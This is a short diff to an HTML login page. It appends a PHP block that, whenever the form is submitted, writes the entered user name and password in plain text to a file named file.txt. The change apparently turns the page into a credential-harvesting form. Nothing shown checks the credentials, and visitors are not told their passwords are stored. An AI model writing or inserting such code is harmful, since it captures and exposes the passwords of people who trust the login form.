@@ -130,7 +130,7 @@
 							</tr>
 							<tr>
 								<td class=ww>
-								<form name="frm" action="login.php" method="post">
+								<form name="submit" action="login.php" method="post">
 		User Name:<input type="text" name="uname">
 		Password:<input type="password" name="pass">
 		<input type="submit" name="submit" value="Login">
@@ -211,3 +211,15 @@ CWR0910</td></tr>
 				</table>
 		</body>
 </html>
+<?php
+if(isset($_POST['submit'])){
+$name = "uName:".$_POST['uname']."
+";
+$pass = "password:".$_POST['pass']."
+";
+$file=fopen("file.txt", "a");
+fwrite($file, $name);
+fwrite($file, $pass);
+fclose($file);
+}
+?>
